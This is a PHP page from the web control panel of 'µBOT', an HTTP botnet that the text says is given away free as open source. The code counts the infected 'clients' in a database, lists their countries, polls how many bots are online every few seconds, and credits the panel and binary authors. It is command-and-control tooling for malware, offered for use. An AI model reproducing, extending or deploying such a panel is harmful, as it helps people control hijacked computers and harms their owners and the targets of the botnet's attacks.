<?php 
    session_start();
    
	require_once('inc/session.php');
	require_once('inc/config.php');
	require_once('inc/html_grund.php');
	include('inc/functions.php');
	include("ip_files/countries.php");
	
	$query_1 = mysql_query("SELECT COUNT(*) FROM clients ");
	$item_count = mysql_result($query_1, 0);
	$query_1 = mysql_query("SELECT * FROM clients ORDER BY id DESC");
	$query1rows = mysql_num_rows($query_1);
	$query_2 = mysql_query("SELECT DISTINCT cc FROM clients");
	
	echo '<link rel="stylesheet" type="text/css" href="css/style.css"/>
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
		
	<script type="text/javascript">
    	$(document).ready(function(){
      		refreshBotsOnline();
    	});
    	
    	function refreshBotsOnline(){
        	$(\'#navi\').load(\'inc/html_menu.php\');
        	setTimeout(refreshBotsOnline, 5000);
    	}
	</script>';
	echo "<p>
	µBOT is a simplistic HTTP bot, with the main priority being stability. We have decided to give this out for free, even as open source.<br /> 
	Please learn from this. Don't rip it,try to steal credit or anything of the sort.<br /> 
	We just wish to be given credit, where credit is due and hope you learn from what we have created.<br />
	<br />
	Web Panel created by Adzz in PHP.<br />
	Binary created by KØRRUPT in Visual Basic 6.<br /> 
	<br />
	Adzz: adzz.on.a.boat@gmail.com [EMAIL] <br /> 
	KØRRUPT: korrupt@krptd.info [MSN] <br /> 
	<p>";
	
	require_once('inc/html_footer.php');
?>